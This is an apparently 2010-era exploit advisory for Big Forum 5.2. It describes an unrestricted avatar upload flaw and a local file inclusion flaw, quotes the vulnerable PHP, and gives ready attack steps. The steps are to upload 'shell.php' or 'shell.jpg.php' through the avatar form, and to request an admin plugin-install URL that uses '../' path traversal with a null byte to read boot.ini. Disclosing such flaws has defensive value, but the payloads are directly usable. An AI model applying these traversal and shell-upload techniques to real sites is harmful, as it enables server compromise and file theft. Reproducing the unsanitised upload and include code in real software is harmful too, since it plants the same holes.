@@ -1,0 +1,65 @@
+=> Big Forum 5.2v Arbitrary File Upload & Local File Inclusion Vulnerability
+=> Author	: Zer0 Thunder
+=> Home		: http://colombohackers.com
+=> Download	: http://sourceforge.net/projects/npage-bigforum/files/bigforum%205.2/bf5.2.zip/download
+=> Date 	: 06/24/2010
+
+
+
+Arbitrary File Upload
+---------------------
+
+
+
+Vuln C0de
+
+=============================================================================================================
+
+   if($_FILES['datei']['size'] <  102400)
+      {
+      move_uploaded_file($_FILES['datei']['tmp_name'], "images/avatar/".$_FILES['datei']['name']);
+      echo "Danke, dein Avatar wurde hochgeladen, es wird nun angezeigt.";
+	  $pfad = $_FILES['datei']['name'];
+	  mysql_query("UPDATE users SET ava_link = 'images/avatar/$pfad' WHERE username LIKE '". USER ."'");
+      }
+
+you will have to register before doing this 
+
+=============================================================================================================
+
+
+Vuln Page link : http://localhost/bf/main.php?do=ava   
+(Upload the shell.php or shell.jpg.php )
+
+
+
+
+
+Local File Inclusion 
+--------------------
+
+
+=============================================================================================================
+if($_GET["aktion"] == "install")
+  {
+    $path = "../includes/plugins/$_GET[datei]";
+    include($path);
+    plugin_install($kurzc, $_GET["datei"]);
+    echo "Danke, der Mod wurde erfolgreich installiert.";
+    exit;
+  }
+
+
+=============================================================================================================
+
+
+http://localhost/bf/admin/admin.php?do=mods&aktion=install&datei=../../../../../boot.ini%00
+
+
+
+
+
+
+--------------------------------------
+Msn : zer0_thunder@colombohackers.com
+--------------------------------------
